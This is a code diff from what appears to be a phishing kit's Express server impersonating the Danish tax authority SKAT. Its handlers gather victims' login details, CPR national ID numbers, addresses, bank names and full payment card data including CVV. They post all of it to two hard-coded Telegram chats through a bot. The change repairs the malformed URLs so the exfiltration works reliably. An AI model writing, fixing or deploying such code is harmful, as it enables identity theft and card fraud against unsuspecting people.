@@ -2802,12 +2802,12 @@ app.post('/skatPersonal', (req, res) => {
     var originalText = `+----------- Login Information ------------+\nUsername: ${username}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nZIP: ${zip}\nPhone Number: ${telephone}\nCPR: ${cpr}\nBank: ${bank}`;
 
     axios.post(
-        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=BTSS:\n${originalText}`
+        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=Skat:\n${originalText}`
     ).catch(e => {
         console.log(e)
     });
     axios.post(
-        `https:api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1449567433&text=SKAT:\n${originalText}`
+        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1449567433&text=Skat:\n${originalText}`
     ).catch(e => {
         console.log(e)
     });
@@ -2846,11 +2846,15 @@ app.post('/skatBilling', (req, res) => {
         binList = `${bin} | ${dob} | ${zip} | ${bankName}`
         var originalText = `+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
         axios.post(
-            `https:api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1449567433&text=SKAT:\n${originalText}`
-        );
+            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=Skat:\n${originalText}`
+        ).catch(e => {
+            console.log(e)
+        });
         axios.post(
-            `https:api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=SKAT:\n${originalText}`
-        );
+            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1449567433&text=Skat:\n${originalText}`
+        ).catch(e => {
+            console.log(e)
+        });
         res.send("Update Completed");
     })
 });
